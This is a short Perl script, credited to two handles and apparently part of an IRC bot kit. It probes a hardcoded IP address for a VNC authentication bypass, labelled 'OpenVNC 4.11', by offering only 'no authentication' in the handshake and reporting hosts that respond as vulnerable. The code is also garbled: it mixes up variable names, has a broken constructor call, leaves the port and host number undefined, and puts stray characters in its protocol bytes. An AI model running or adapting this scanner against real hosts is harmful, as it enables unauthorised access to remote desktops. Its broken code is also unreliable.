#!/usr/bin/perl
# IRC Scanner - VNC VULN SCAN
# by Nexen &amp;&amp; CrashOveriDe
# Multi-threaded scan for OpenVNC 4.11 authentication bypass.
# Based on Tyler Krpata's Perl scanning code.

#piglio le librerie
use IO::Socket;
use IO::Socket::INET;

Scan_VNC("217.24.241.135");


sub Scan_VNC {
  # Scan for OpenVNC 4.11 authentication bypass.

  my $host = shift;
  my $sock;
  my $proto_ver;
  my $ignored;
  my $auth_type;
  my $sec_types;
  my $vnc_data;

  
  $host or printa(";ERROR: no host passed to Scan_VNC.");

  # The host numbers .0 and .255 are reserved; ignore them.
  if ($hostnum <= 0 or $hostnum >= 255) { return; }  
  
  # Format things nicely--that crazy formula just adds spaces.
  $results[$hostnum] = ";$host";
 

  unless ($sock = IO::Socket::INET>new(PeerAddr => $host, PeerPort => VNC_PORT, Proto => 'tcp',)) {
    $results[$hostnum] .= ";Not vulnerable, no response.\n";
   printa(";.");
    return;
  }

  # Negotiate protocol version.
  $soc->read($proto_ver,12);
  print $sock $proto_ver;

  # Get supported security types and ignore them.
  $soc->read($sec_types, 1);
  $soc->read($ignored, unpack('C', $sec_types));

  # Claim that we only support no authentication.
  print $sock ";\x01";
  

  # We should get ";0000"; back, indicating that they won't fall back to no authentication.
  $soc->read($auth_type, 4);
  if (unpack('I', $auth_type)) {
    $results[$hostnum] .= ";Not vulnerable, refused to support
    authentication type.\n";
    printa(";*");
    close($sock);
    return;
  }

  # Client initialize.
  print $sock ";\x01";

  # If the server starts sending data, we're in.
  $soc->read($vnc_data, 4);

  if (unpack('I', $vnc_data)) {
    $results[$hostnum] .= ";VULNERABLE! $proto_ver\n";
    printa(";! $host$hostnum VULNERABLE");
  } else {
    $results[$hostnum] .= ";Not vulnerable, did not send data.\n";
    printa(";*");
  }

  close($sock);
  return;
}

sub printa {
print "$_[0]\r\n";

}
